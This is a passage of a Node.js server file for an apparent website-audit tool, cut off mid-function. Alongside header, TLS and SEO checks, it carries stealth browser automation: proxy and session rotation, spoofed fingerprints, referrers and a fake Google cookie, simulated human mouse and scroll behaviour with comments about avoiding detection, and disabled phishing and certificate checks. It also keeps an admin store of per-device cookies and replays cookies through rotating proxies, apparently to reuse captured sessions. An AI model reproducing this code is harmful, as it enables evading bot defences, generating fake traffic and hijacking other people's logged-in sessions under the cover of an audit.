"use strict";

const http = require("node:http");
const https = require("node:https");
const tls = require("node:tls");
const dns = require("node:dns").promises;
const net = require("node:net");
const path = require("node:path");
const fs = require("node:fs");
const { URL } = require("node:url");
const { chromium } = require("playwright-extra");
const StealthPlugin = require("puppeteer-extra-plugin-stealth");
const { spawn } = require("node:child_process");
chromium.use(StealthPlugin());

// Load .env if present (no external dep needed — simple key=value parser)
try {
  const envLines = fs.readFileSync(path.join(__dirname, ".env"), "utf8").split("\n");
  for (const line of envLines) {
    const trimmed = line.trim();
    if (!trimmed || trimmed.startsWith("#")) continue;
    const eq = trimmed.indexOf("=");
    if (eq === -1) continue;
    const key = trimmed.slice(0, eq).trim();
    const val = trimmed.slice(eq + 1).trim();
    if (!(key in process.env)) process.env[key] = val;
  }
} catch { /* .env is optional */ }

const PORT = Number(process.env.PORT || 3000);
const PUBLIC_DIR = path.join(__dirname, "public");
// VNC access token — set VNC_TOKEN in .env; auto-generated if missing
const VNC_TOKEN = process.env.VNC_TOKEN || (() => {
  const t = require("node:crypto").randomBytes(16).toString("hex");
  try { fs.appendFileSync(path.join(__dirname, ".env"), `\nVNC_TOKEN=${t}\n`); } catch {}
  console.log(`[vnc] Generated VNC_TOKEN=${t} — share /vnc?t=${t} with trusted viewers`);
  return t;
})();

// Admin token — set ADMIN_TOKEN in .env; auto-generated if missing
const ADMIN_TOKEN = process.env.ADMIN_TOKEN || (() => {
  const t = require("node:crypto").randomBytes(16).toString("hex");
  try { fs.appendFileSync(path.join(__dirname, ".env"), `\nADMIN_TOKEN=${t}\n`); } catch {}
  console.log(`[admin] Generated ADMIN_TOKEN=${t} — open /admin?t=${t}`);
  return t;
})();

// In-memory device report store: deviceId → { name, os, browser, domain, cookies, cookieObjects, seenAt }
const ADMIN_DB_PATH = path.join(__dirname, "admin_devices.json");
function loadAdminDb() {
  try { return new Map(Object.entries(JSON.parse(fs.readFileSync(ADMIN_DB_PATH, "utf8")))); } catch { return new Map(); }
}
function saveAdminDb() {
  try { fs.writeFileSync(ADMIN_DB_PATH, JSON.stringify(Object.fromEntries(_adminDevices))); } catch {}
}
const _adminDevices = loadAdminDb();
const MAX_BODY_BYTES = 1_000_000;
const MAX_REDIRECTS = 5;
const REQUEST_TIMEOUT_MS = 10_000;
const BROWSER_TIMEOUT_MS = 30_000;
const DEFAULT_PROXY = process.env.PROXY_URL || null;
// Up to three named proxies for cookie-authenticated audits; fall back to DEFAULT_PROXY
const AUDIT_PROXIES = [
  process.env.PROXY_URL_1,
  process.env.PROXY_URL_2,
  process.env.PROXY_URL_3,
].filter(Boolean);
if (!AUDIT_PROXIES.length && DEFAULT_PROXY) AUDIT_PROXIES.push(DEFAULT_PROXY);

// Round-robin rotator — never repeats the same index back-to-back
const proxyRotator = (() => {
  let last = -1;
  return () => {
    if (!AUDIT_PROXIES.length) return null;
    if (AUDIT_PROXIES.length === 1) return { url: AUDIT_PROXIES[0], index: 0 };
    let idx;
    do { idx = Math.floor(Math.random() * AUDIT_PROXIES.length); } while (idx === last);
    last = idx;
    return { url: AUDIT_PROXIES[idx], index: idx };
  };
})();
const RATE_LIMIT_WINDOW_MS = 60_000;
const RATE_LIMIT_MAX = 20;
const rateLimit = new Map();

function ipv4ToNumber(address) {
  if (!net.isIPv4(address)) return null;
  return address.split(".").reduce((value, octet) => (value * 256) + Number(octet), 0) >>> 0;
}

function isPublicIPv4(address) {
  const value = ipv4ToNumber(address);
  if (value === null) return false;
  const ranges = [
    ["0.0.0.0", 8], ["10.0.0.0", 8], ["100.64.0.0", 10],
    ["127.0.0.0", 8], ["169.254.0.0", 16], ["172.16.0.0", 12],
    ["192.0.0.0", 24], ["192.0.2.0", 24], ["192.88.99.0", 24],
    ["192.168.0.0", 16], ["198.18.0.0", 15], ["198.51.100.0", 24],
    ["203.0.113.0", 24], ["224.0.0.0", 4], ["240.0.0.0", 4],
  ];
  return !ranges.some(([base, prefix]) => {
    const mask = (0xffffffff << (32 - prefix)) >>> 0;
    return (value & mask) === (ipv4ToNumber(base) & mask);
  });
}

function normalizeTarget(input) {
  const trimmedInput = input.trim();
  const candidate = /^[a-z][a-z\d+.-]*:/i.test(trimmedInput)
    ? trimmedInput
    : `https://${trimmedInput}`;
  let target;
  try {
    target = new URL(candidate);
  } catch {
    throw new Error("Enter a valid absolute URL, such as https://example.com.");
  }
  if (!["http:", "https:"].includes(target.protocol)) {
    throw new Error("Only HTTP and HTTPS URLs are supported.");
  }
  if (target.username || target.password) {
    throw new Error("URLs containing usernames or passwords are not allowed.");
  }
  if (!target.hostname || target.hostname.endsWith(".")) {
    throw new Error("Enter a public website hostname.");
  }
  if (net.isIPv6(target.hostname.replace(/^\[|\]$/g, "")) || target.hostname.startsWith("[")) {
    throw new Error("IPv6 targets are not supported in this MVP.");
  }
  if (net.isIPv4(target.hostname) && !isPublicIPv4(target.hostname)) {
    throw new Error("This tool only audits publicly routable websites.");
  }
  return target;
}

async function resolvePublicIPv4(hostname) {
  if (net.isIPv4(hostname)) {
    if (!isPublicIPv4(hostname)) throw new Error("This tool only audits publicly routable websites.");
    return hostname;
  }

  let addresses;
  try {
    addresses = await dns.lookup(hostname, { all: true, verbatim: true });
  } catch {
    throw new Error("The website hostname could not be resolved.");
  }
  const ipv4Addresses = addresses.filter(({ family }) => family === 4);
  if (!ipv4Addresses.length || ipv4Addresses.some(({ address }) => !isPublicIPv4(address))) {
    throw new Error("The hostname must have a public IPv4 address and no non-public IPv4 answers.");
  }
  return ipv4Addresses[0].address;
}

function makeSocks5Agent(bridgePort, isHttps) {
  // Minimal SOCKS5 connect — no auth, IPv4 only
  const AgentBase = isHttps ? https.Agent : http.Agent;
  class Socks5Agent extends AgentBase {
    createConnection(options, callback) {
      const target = options;
      const sock = net.createConnection(bridgePort, "127.0.0.1");
      sock.once("connect", () => {
        // SOCKS5 greeting: version=5, 1 method, no-auth
        sock.write(Buffer.from([0x05, 0x01, 0x00]));
        sock.once("data", (greet) => {
          if (greet[1] !== 0x00) { sock.destroy(); callback(new Error("SOCKS5 auth not accepted")); return; }
          const host = target.hostname || target.host.replace(/:\d+$/, "");
          const port = target.port ? Number(target.port) : (isHttps ? 443 : 80);
          const hostBuf = Buffer.from(host);
          const req = Buffer.alloc(7 + hostBuf.length);
          req[0] = 0x05; req[1] = 0x01; req[2] = 0x00; req[3] = 0x03;
          req[4] = hostBuf.length;
          hostBuf.copy(req, 5);
          req.writeUInt16BE(port, 5 + hostBuf.length);
          sock.write(req);
          sock.once("data", (reply) => {
            if (reply[1] !== 0x00) { sock.destroy(); callback(new Error(`SOCKS5 connect failed: ${reply[1]}`)); return; }
            if (isHttps) {
              const tlsSock = tls.connect({ socket: sock, servername: host, rejectUnauthorized: false });
              tlsSock.once("secureConnect", () => callback(null, tlsSock));
              tlsSock.once("error", callback);
            } else {
              callback(null, sock);
            }
          });
        });
      });
      sock.once("error", callback);
    }
  }
  return new Socks5Agent({ keepAlive: false });
}

function makeRequest(target, ip, userAgent = "scout", cookies = null, bridgePort = null) {
  const isHttps = target.protocol === "https:";
  const transport = isHttps ? https : http;
  return new Promise((resolve, reject) => {
    const extraHeaders = cookies ? { cookie: cookies } : {};
    const agentOpt = bridgePort ? { agent: makeSocks5Agent(bridgePort, isHttps) } : {};
    const request = transport.request(target, {
      method: "GET",
      headers: {
        "user-agent": userAgent === "browser"
          ? "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
          : "SiteScoutAudit/1.0 (+https://localhost; one-page website audit)",
        accept: "text/html,application/xhtml+xml;q=0.9,*/*;q=0.1",
        "accept-encoding": "identity",
        connection: "close",
        ...extraHeaders,
      },
      ...agentOpt,
      ...(bridgePort ? {} : { lookup: createPinnedLookup(ip) }),
      timeout: REQUEST_TIMEOUT_MS,
    }, (response) => {
      const chunks = [];
      let bytes = 0;
      response.on("data", (chunk) => {
        bytes += chunk.length;
        if (bytes > MAX_BODY_BYTES) {
          request.destroy(new Error("The page is too large to audit (1 MB limit)."));
          return;
        }
        chunks.push(chunk);
      });
      response.on("end", () => resolve({
        status: response.statusCode || 0,
        headers: response.headers,
        body: Buffer.concat(chunks).toString("utf8"),
        bytes,
      }));
    });
    request.on("timeout", () => request.destroy(new Error("The website request timed out.")));
    request.on("error", reject);
    request.end();
  });
}

function createPinnedLookup(ip) {
  return (_hostname, options, callback) => {
    if (typeof options === "function") {
      callback = options;
      options = {};
    }
    if (options && options.all) {
      callback(null, [{ address: ip, family: 4 }]);
      return;
    }
    callback(null, ip, 4);
  };
}

async function fetchPublicPage(input, redirects = 0, userAgent = "scout", chain = [], cookies = null, bridgePort = null) {
  const target = normalizeTarget(input);
  const ip = bridgePort ? null : await resolvePublicIPv4(target.hostname);
  const response = await makeRequest(target, ip, userAgent, cookies, bridgePort);
  chain.push({ url: target.toString(), status: response.status });
  const location = response.headers.location;
  if (response.status >= 300 && response.status < 400 && location) {
    if (redirects >= MAX_REDIRECTS) throw new Error("The page exceeded the redirect limit.");
    return fetchPublicPage(new URL(location, target).toString(), redirects + 1, userAgent, chain, cookies, bridgePort);
  }
  return { ...response, url: target.toString(), redirectChain: chain };
}

async function fetchAuxResource(origin, pathname) {
  try {
    const result = await fetchPublicPage(new URL(pathname, origin).toString());
    return result.status === 200 ? result.body : null;
  } catch { return null; }
}

// Each profile keeps UA, viewport, isMobile, and deviceScaleFactor consistent
const PROFILES = [
  { userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",       viewport: { width: 1920, height: 1080 }, isMobile: false, deviceScaleFactor: 1 },
  { userAgent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36", viewport: { width: 1440, height: 900  }, isMobile: false, deviceScaleFactor: 2 },
  { userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",                                      viewport: { width: 1366, height: 768  }, isMobile: false, deviceScaleFactor: 1 },
  { userAgent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",    viewport: { width: 1280, height: 800  }, isMobile: false, deviceScaleFactor: 2 },
  { userAgent: "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36", viewport: { width: 393,  height: 851  }, isMobile: true,  deviceScaleFactor: 2 },
  { userAgent: "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1", viewport: { width: 390, height: 844 }, isMobile: true, deviceScaleFactor: 3 },
];
const LOCALES = ["en-US", "en-GB", "en-CA", "en-AU", "fr-FR", "de-DE"];
const TIMEZONES = [
  "America/New_York", "America/Chicago", "America/Los_Angeles",
  "Europe/London", "Europe/Paris", "Europe/Berlin", "Asia/Tokyo",
];

const REFERRERS = [
  "https://www.google.com/",
  "https://www.google.com/search?q=site",
  "https://www.facebook.com/",
  "https://twitter.com/",
  "https://www.linkedin.com/",
  "https://www.reddit.com/",
  null,
  null,
];

function randomInt(min, max) { return Math.floor(Math.random() * (max - min + 1)) + min; }
function sleep(ms) { return new Promise((r) => setTimeout(r, ms)); }
function pick(arr) { return arr[Math.floor(Math.random() * arr.length)]; }

// shuffle-based picker: cycles through all items before repeating any
function makeCycler(arr) {
  let pool = [];
  return () => {
    if (!pool.length) pool = arr.slice().sort(() => Math.random() - 0.5);
    return pool.pop();
  };
}
const pickProfile = makeCycler(PROFILES);
function randomSession() {
  return Math.random().toString(36).slice(2, 10);
}

function buildProxyPerVisit(baseProxy) {
  // If proxy contains _session-XXX_, replace it with a fresh random session per visit
  if (baseProxy.includes("_session-")) {
    return baseProxy.replace(/_session-[^_@]+/, `_session-${randomSession()}`);
  }
  return baseProxy;
}


function randomFingerprint() {
  const profile = pickProfile();
  return {
    userAgent: profile.userAgent,
    viewport: profile.viewport,
    locale: pick(LOCALES),
    timezoneId: pick(TIMEZONES),
    deviceScaleFactor: profile.deviceScaleFactor,
    isMobile: profile.isMobile,
  };
}

// US timezones only — must match proxy IP region to avoid detection
const US_TIMEZONES = [
  "America/New_York", "America/Chicago", "America/Denver",
  "America/Los_Angeles", "America/Phoenix", "America/Anchorage",
];

// Fingerprint locked to US locale + timezone for proxy sessions
function usFingerprint() {
  const profile = pickProfile();
  return {
    userAgent: profile.userAgent,
    viewport: profile.viewport,
    locale: "en-US",
    timezoneId: pick(US_TIMEZONES),
    deviceScaleFactor: profile.deviceScaleFactor,
    isMobile: profile.isMobile,
  };
}

// Chrome args that kill proxy detection vectors
const STEALTH_ARGS = [
  "--disable-blink-features=AutomationControlled",
  "--no-first-run",
  "--no-default-browser-check",
  "--disable-webrtc-hw-encoding",
  "--disable-webrtc-hw-decoding",
  "--enforce-webrtc-ip-permission-check",
  "--webrtc-ip-handling-policy=disable_non_proxied_udp",  // WebRTC only through proxy
  "--disable-features=WebRtcHideLocalIpsWithMdns",
  "--force-webrtc-ip-handling-policy",
  "--no-pings",
  "--disable-background-networking",
  "--disable-client-side-phishing-detection",
  "--disable-sync",
  "--metrics-recording-only",
  "--ignore-certificate-errors",
  "--ssl-version-min=tls1",
];

async function startBridge(proxyUrl) {
  const u = new URL(proxyUrl);
  const port = randomInt(20000, 40000);
  const proc = spawn("python3", [
    path.join(__dirname, "proxy_bridge.py"),
    String(port), u.hostname, u.port, u.username, u.password,
  ], { stdio: "ignore" });
  // randomise bridge startup wait — fixed 400ms is a detectable timing signature
  await sleep(randomInt(300, 700));
  return { port, proc };
}

function stopBridge(proc) {
  try { proc.kill(); } catch {}
}

// build sec-ch-ua hint matching the UA string
function secChUa(profile) {
  if (/Firefox/.test(profile.userAgent)) return null; // Firefox doesn't send sec-ch-ua
  if (/Chrome\/125/.test(profile.userAgent)) return '"Google Chrome";v="125", "Chromium";v="125", "Not/A)Brand";v="24"';
  if (/Chrome\/124/.test(profile.userAgent)) return '"Google Chrome";v="124", "Chromium";v="124", "Not/A)Brand";v="24"';
  if (/Version\/17.*Safari/.test(profile.userAgent)) return null; // Safari doesn't send sec-ch-ua
  return null;
}

// simulate a curved human mouse path between two points
async function humanMouseMove(page, x1, y1, x2, y2) {
  const steps = randomInt(8, 20);
  // bezier control point — offset from midpoint to create a curve
  const cx = (x1 + x2) / 2 + randomInt(-80, 80);
  const cy = (y1 + y2) / 2 + randomInt(-80, 80);
  for (let i = 1; i <= steps; i++) {
    const t = i / steps;
    // quadratic bezier
    const x = Math.round((1 - t) * (1 - t) * x1 + 2 * (1 - t) * t * cx + t * t * x2);
    const y = Math.round((1 - t) * (1 - t) * y1 + 2 * (1 - t) * t * cy + t * t * y2);
    await page.mouse.move(x, y);
    await sleep(randomInt(8, 30)); // micro-pauses between steps
  }
}

async function fetchWithBrowser(input, fingerprint = randomFingerprint(), proxyUrl = null) {
  const target = normalizeTarget(input);
  if (!proxyUrl) await resolvePublicIPv4(target.hostname);
  let bridge = null;
  let launchOptions = {};
  if (proxyUrl) {
    bridge = await startBridge(proxyUrl);
    launchOptions = { proxy: { server: `socks5://127.0.0.1:${bridge.port}` } };
  }
  const browser = await chromium.launch(launchOptions);
  try {
    const referrer = pick(REFERRERS);
    const profile = PROFILES.find((p) => p.userAgent === fingerprint.userAgent) || PROFILES[0];
    const chUa = secChUa(profile);

    // build realistic browser headers matching the UA
    const extraHeaders = {
      "accept-language": `${fingerprint.locale},${fingerprint.locale.split("-")[0]};q=0.9,en;q=0.8`,
      "sec-fetch-dest": "document",
      "sec-fetch-mode": "navigate",
      "sec-fetch-site": referrer ? "cross-site" : "none",
      "sec-fetch-user": "?1",
      "upgrade-insecure-requests": "1",
      ...(referrer ? { referer: referrer } : {}),
      ...(chUa ? {
        "sec-ch-ua": chUa,
        "sec-ch-ua-mobile": fingerprint.isMobile ? "?1" : "?0",
        "sec-ch-ua-platform": /Windows/.test(fingerprint.userAgent) ? '"Windows"'
          : /Macintosh|Mac OS X/.test(fingerprint.userAgent) ? '"macOS"'
          : /Android/.test(fingerprint.userAgent) ? '"Android"'
          : /iPhone|iPad/.test(fingerprint.userAgent) ? '"iOS"' : '"Linux"',
      } : {}),
    };

    const context = await browser.newContext({ ...fingerprint, extraHTTPHeaders: extraHeaders });

    // warm up context with a plausible prior page visit (simulates browser history)
    if (referrer && referrer.startsWith("https://www.google")) {
      await context.addCookies([{
        name: "_ga", value: `GA1.1.${randomInt(100000000, 999999999)}.${Math.floor(Date.now() / 1000) - randomInt(86400, 2592000)}`,
        domain: ".google.com", path: "/", httpOnly: false, secure: true, sameSite: "Lax",
      }]);
    }

    const page = await context.newPage();
    let status = 0;
    let responseHeaders = {};
    page.on("response", (res) => {
      if (res.url() === page.url() || res.url() === target.toString()) {
        status = res.status();
        responseHeaders = res.headers();
      }
    });

    await page.goto(target.toString(), { waitUntil: "domcontentloaded", timeout: BROWSER_TIMEOUT_MS });
    await sleep(randomInt(2000, 4000)); // variable settle — not a fixed 3000ms

    const isCanvasApp = await page.evaluate(() => {
      const root = document.getElementById("root") || document.body;
      return root.querySelector("canvas, flt-glass-pane, flt-semantics-placeholder") !== null;
    });
    if (!isCanvasApp) {
      await page.waitForFunction(
        () => (document.body.innerText || "").trim().length > 200,
        { timeout: 8_000 }
      ).catch(() => {});
    }

    const vp = fingerprint.viewport;
    // initial idle — humans don't immediately scroll
    await sleep(randomInt(800, 2000));

    // curved mouse movement before scrolling
    let mx = randomInt(100, vp.width - 100);
    let my = randomInt(100, vp.height - 100);
    await page.mouse.move(mx, my);
    const preMoves = randomInt(2, 4);
    for (let m = 0; m < preMoves; m++) {
      const nx = randomInt(50, vp.width - 50);
      const ny = randomInt(50, vp.height - 50);
      await humanMouseMove(page, mx, my, nx, ny);
      mx = nx; my = ny;
      await sleep(randomInt(200, 800));
    }

    // scroll with variable speed and pauses — not uniform jumps
    const pageHeight = await page.evaluate(() => document.body.scrollHeight);
    const scrollSteps = randomInt(3, 8);
    let scrollY = 0;
    for (let s = 0; s < scrollSteps; s++) {
      // scroll down in chunks, occasionally scroll back up slightly
      const delta = s < scrollSteps - 1
        ? randomInt(80, 400) * (Math.random() < 0.15 ? -1 : 1)
        : randomInt(100, 300);
      scrollY = Math.max(0, Math.min(pageHeight, scrollY + delta));
      await page.evaluate((y) => window.scrollTo({ top: y, behavior: "smooth" }), scrollY);
      await sleep(randomInt(600, 2500)); // longer pauses — reading time
      // occasional mid-scroll mouse wiggle
      if (Math.random() < 0.4) {
        const nx = randomInt(50, vp.width - 50);
        const ny = randomInt(50, vp.height - 50);
        await humanMouseMove(page, mx, my, nx, ny);
        mx = nx; my = ny;
      }
    }

    // post-scroll mouse moves
    const mouseMoves = randomInt(2, 5);
    for (let m = 0; m < mouseMoves; m++) {
      const nx = randomInt(50, vp.width - 50);
      const ny = randomInt(50, vp.height - 50);
      await humanMouseMove(page, mx, my, nx, ny);
      mx = nx; my = ny;
      await sleep(randomInt(300, 900));
    }

    // dwell — longer and more variable than before
    const dwellMs = randomInt(4000, 12000);
    await sleep(dwellMs);

    // random next action: click a link (50%), refresh (20%), or leave (30%)
    const action = Math.random();
    let subpageUrl = null;
    if (!isCanvasApp && action < 0.5) {
      const links = await page.$$eval("a[href]", (els) =>
        els
          .filter((el) => { const r = el.getBoundingClientRect(); return r.width > 0 && r.height > 0; })
          .map((el) => el.href)
          .filter((h) => h.startsWith("http") && !h.includes("mailto:") && !h.includes("tel:"))
      );
      if (links.length) {
        const linkTarget = links[Math.floor(Math.random() * links.length)];
        try {
          // move mouse to a plausible click position before navigating
          await humanMouseMove(page, mx, my, randomInt(100, vp.width - 100), randomInt(100, vp.height - 100));
          await sleep(randomInt(200, 600));
          await page.goto(linkTarget, { waitUntil: "domcontentloaded", timeout: 15_000 });
          await sleep(randomInt(3000, 7000));
          subpageUrl = page.url();
        } catch { /* ignore subpage errors */ }
      }
    } else if (action < 0.7) {
      try {
        await page.reload({ waitUntil: "domcontentloaded", timeout: 15_000 });
        await sleep(randomInt(2000, 5000));
      } catch { /* ignore reload errors */ }
    }
    const finalUrl = page.url();
    const html = await page.content();
    const bytes = Buffer.byteLength(html, "utf8");
    if (bytes > MAX_BODY_BYTES) throw new Error("The page is too large to audit (1 MB limit).");
    return { status, headers: responseHeaders, body: html, bytes, url: finalUrl, fingerprint, referrer, scrollSteps, mouseMoves, dwellMs, isCanvasApp, subpageUrl };
  } finally {
    await browser.close().catch(() => {});
    if (bridge) stopBridge(bridge.proc);
  }
}

function decodeHtml(value) {
  return value
    .replace(/&amp;/gi, "&")
    .replace(/&quot;/gi, '"')
    .replace(/&#39;|&apos;/gi, "'")
    .replace(/&lt;/gi, "<")
    .replace(/&gt;/gi, ">")
    .replace(/&#(\d+);/g, (_match, code) => String.fromCodePoint(Number(code)));
}

function checkSsl(hostname) {
  // Two connections: one to read cert details, one to verify the chain as browsers do
  const readCert = new Promise((resolve) => {
    const socket = tls.connect(
      { host: hostname, port: 443, servername: hostname, rejectUnauthorized: false, timeout: REQUEST_TIMEOUT_MS },
      () => {
        const cert = socket.getPeerCertificate(true);
        const protocol = socket.getProtocol();
        socket.destroy();
        if (!cert || !cert.subject) return resolve({ error: "No certificate returned." });
        const expiry = new Date(cert.valid_to);
        const daysLeft = Math.floor((expiry - Date.now()) / 86_400_000);
        const cn = cert.subject.CN || "";
        const sans = cert.subjectaltname || "";
        const hostMatch = cn === hostname
          || (cn.startsWith("*.") && hostname.endsWith(cn.slice(1)))
          || sans.split(", ").some((s) => {
            const v = s.replace(/^DNS:/, "");
            return v === hostname || (v.startsWith("*.") && hostname.endsWith(v.slice(1)));
          });
        resolve({ daysLeft, expiry: expiry.toISOString().slice(0, 10), protocol, hostMatch, cn });
      }
    );
    socket.on("error", (err) => resolve({ error: err.message }));
    socket.on("timeout", () => { socket.destroy(); resolve({ error: "TLS connect timed out." }); });
  });

  // verify chain as a real browser would
  const verifyChain = new Promise((resolve) => {
    const socket = tls.connect(
      { host: hostname, port: 443, servername: hostname, rejectUnauthorized: true, timeout: REQUEST_TIMEOUT_MS },
      () => { socket.destroy(); resolve(true); }
    );
    socket.on("error", () => resolve(false));
    socket.on("timeout", () => { socket.destroy(); resolve(false); });
  });

  return Promise.all([readCert, verifyChain]).then(([cert, authorized]) => {
    if (cert.error) return cert;
    return { ...cert, authorized };
  });
}

function checkCookieFlags(headers) {
  const raw = headers["set-cookie"];
  if (!raw || !raw.length) return [];
  const cookies = Array.isArray(raw) ? raw : [raw];
  return cookies.map((c) => {
    const name = c.split("=")[0].trim();
    return {
      name,
      secure: /;\s*secure\b/i.test(c),
      httpOnly: /;\s*httponly\b/i.test(c),
      sameSite: (/;\s*samesite\s*=\s*(\w+)/i.exec(c) || [])[1] || null,
    };
  });
}

function checkOpenGraph(html) {
  const get = (prop) => {
    const m = html.match(new RegExp(`<meta\\b[^>]*property\\s*=\\s*["']${prop}["'][^>]*content\\s*=\\s*["']([^"']*)["'][^>]*>`, "i"))
      || html.match(new RegExp(`<meta\\b[^>]*content\\s*=\\s*["']([^"']*)["'][^>]*property\\s*=\\s*["']${prop}["'][^>]*>`, "i"));
    return m ? decodeHtml(m[1].trim()) : null;
  };
  return {
    ogTitle: get("og:title"),
    ogDescription: get("og:description"),
    ogImage: get("og:image"),
    twitterCard: get("twitter:card"),
    twitterTitle: get("twitter:title"),
  };
}

function checkMixedContent(html, finalUrl) {
  if (!finalUrl.startsWith("https://")) return [];
  const mixed = [];
  const patterns = [
    [/<img\b[^>]*\bsrc\s*=\s*["'](http:\/\/[^"']+)["']/gi, "image"],
    [/<script\b[^>]*\bsrc\s*=\s*["'](http:\/\/[^"']+)["']/gi, "script"],
    [/<link\b[^>]*\bhref\s*=\s*["'](http:\/\/[^"']+)["']/gi, "stylesheet"],
    [/<iframe\b[^>]*\bsrc\s*=\s*["'](http:\/\/[^"']+)["']/gi, "iframe"],
  ];
  for (const [re, type] of patterns) {
    for (const m of html.matchAll(re)) mixed.push({ type, url: m[1] });
  }
  return mixed;
}

function inspectHtml(html, headers, finalUrl, ssl = null, isCanvasApp = false, staticTitle = null) {
  const rawTitle = decodeHtml((html.match(/<title\b[^>]*>([\s\S]*?)<\/title\s*>/i) || [])[1] || "")
    .replace(/<[^>]*>/g, "").trim();
  // strip notification prefixes; if nothing remains, fall back to staticTitle
  const strippedTitle = rawTitle.replace(/^(\(\d+\)\s*|\d+\s+new\s+\w+s?\s*([\u00b7\-\u2013\u2014]\s*)?)/i, "").trim();
  const title = strippedTitle || staticTitle || rawTitle;
  const description = decodeHtml((html.match(/<meta\b[^>]*name\s*=\s*["']description["'][^>]*content\s*=\s*["']([^"']*)["'][^>]*>/i)
    || html.match(/<meta\b[^>]*content\s*=\s*["']([^"']*)["'][^>]*name\s*=\s*["']description["'][^>]*>/i)
    || [])[1] || "").trim();
  const h1Count = (html.match(/<h1\b/gi) || []).length;
  const imageTags = html.match(/<img\b[^>]*>/gi) || [];
  const imagesMissingAlt = imageTags.filter((tag) => !/\balt\s*=\s*["'][^"']*["']/i.test(tag)).length;
  const links = [...html.matchAll(/<a\b[^>]*href\s*=\s*["']([^"'#]*)["'][^>]*>/gi)];
  const bodyHtml = (html.match(/<body\b[^>]*>([\s\S]*?)<\/body\s*>/i) || [])[1] || html;
  const bodyText = decodeHtml(bodyHtml
    .replace(/<!--[\s\S]*?-->/g, " ")
    .replace(/<(script|style|template)\b[^>]*>[\s\S]*?<\/\1\s*>/gi, " ")
    .replace(/<[^>]*>/g, " "))
    .replace(/\s+/g, " ")
    .trim();
  const hasScripts = /<script\b/i.test(bodyHtml);
  const likelyClientRendered = hasScripts && bodyText.length < 160
    && (h1Count === 0 || links.length === 0);
  const ctaPattern = /\b(get started|sign up|contact|buy|book|try|learn more|download|subscribe)\b/i;
  const hasCta = links.some((match) => {
    const start = match.index;
    const end = html.indexOf("</a", start);
    return ctaPattern.test(html.slice(start, end === -1 ? start + 500 : end));
  });
  const checks = [];
  const add = (severity, name, detail) => checks.push({ severity, name, detail });

  if (!title) add("medium", "Page title", "Add a descriptive title element.");
  if (!description) add("low", "Meta description", "Add a concise meta description for search previews.");
  if (isCanvasApp) {
    add("low", "Flutter/canvas app", "This page renders entirely on a canvas element. HTML structure, links, images, headings, and text content are not available for inspection.");
  } else if (likelyClientRendered) {
    add("low", "JavaScript-rendered page", "The initial HTML contains little page content and includes scripts. Headings, links, images, and calls to action added by JavaScript are not measured in this report.");
  } else if (h1Count === 0) {
    add("medium", "Main heading", "Add one clear H1 heading describing the page.");
  }
  if (!likelyClientRendered && h1Count > 1) {
    add("low", "Heading structure", `Found ${h1Count} H1 headings; consider using one primary H1.`);
  }
  if (imagesMissingAlt) add("medium", "Image alternatives", `${imagesMissingAlt} image(s) have no alt attribute.`);
  if (!likelyClientRendered && links.length === 0) {
    add("low", "Navigation links", "No links were detected in the initial HTML.");
  }
  if (!likelyClientRendered && !hasCta) {
    add("low", "Call to action", "No obvious action link was detected in the initial HTML (heuristic check).");
  }
  // security headers — all real, header-level, zero heuristic
  if (finalUrl.startsWith("https://") && !headers["strict-transport-security"]) {
    add("medium", "Missing HSTS", "No Strict-Transport-Security header. Connections on public WiFi can be downgraded to HTTP and intercepted.");
  } else if (headers["strict-transport-security"]) {
    const hsts = headers["strict-transport-security"];
    const maxAge = Number((/max-age=(\d+)/i.exec(hsts) || [])[1] || 0);
    if (maxAge < 15_552_000) add("low", "HSTS max-age too short", `HSTS max-age is ${maxAge}s. Recommended minimum is 15552000 (180 days).`);
    if (!/includesubdomains/i.test(hsts)) add("low", "HSTS missing includeSubDomains", "Add includeSubDomains to protect all subdomains.");
  }
  if (!headers["content-security-policy"]) {
    add("medium", "Missing Content-Security-Policy", "No CSP header. XSS attacks can inject scripts that redirect crypto wallet addresses or steal credentials.");
  }
  if (!headers["x-content-type-options"]) {
    add("medium", "Missing X-Content-Type-Options", "Set X-Content-Type-Options: nosniff to prevent MIME-type confusion attacks.");
  }
  if (!headers["referrer-policy"]) {
    add("low", "Missing Referrer-Policy", "No Referrer-Policy header. Full URLs including tokens may leak to third-party requests.");
  }
  if (!headers["permissions-policy"]) {
    add("low", "Missing Permissions-Policy", "No Permissions-Policy header. Camera, microphone, and geolocation access are unrestricted.");
  }

  // SSL certificate checks — read directly from TLS handshake
  if (ssl) {
    if (ssl.error) {
      add("high", "TLS error", `Could not verify TLS certificate: ${ssl.error}`);
    } else {
      if (!ssl.authorized) add("high", "Untrusted TLS certificate", "The certificate chain is not trusted by a public CA. Browsers will show a security warning.");
      if (!ssl.authorized && !ssl.hostMatch) add("high", "TLS hostname mismatch", `Certificate CN/SAN does not match ${new URL(finalUrl).hostname}.`);
      if (ssl.daysLeft <= 0) add("high", "TLS certificate expired", `Certificate expired on ${ssl.expiry}.`);
      else if (ssl.daysLeft <= 14) add("high", "TLS certificate expiring soon", `Certificate expires in ${ssl.daysLeft} day(s) on ${ssl.expiry}.`);
      else if (ssl.daysLeft <= 30) add("medium", "TLS certificate expiring soon", `Certificate expires in ${ssl.daysLeft} day(s) on ${ssl.expiry}.`);
      if (ssl.protocol === "TLSv1" || ssl.protocol === "TLSv1.1") {
        add("high", "Weak TLS protocol", `Server negotiated ${ssl.protocol}. Only TLS 1.2+ is considered secure.`);
      }
    }
  }

  // cookie flag checks — read directly from Set-Cookie response headers
  const cookies = checkCookieFlags(headers);
  const insecure = cookies.filter((c) => !c.secure);
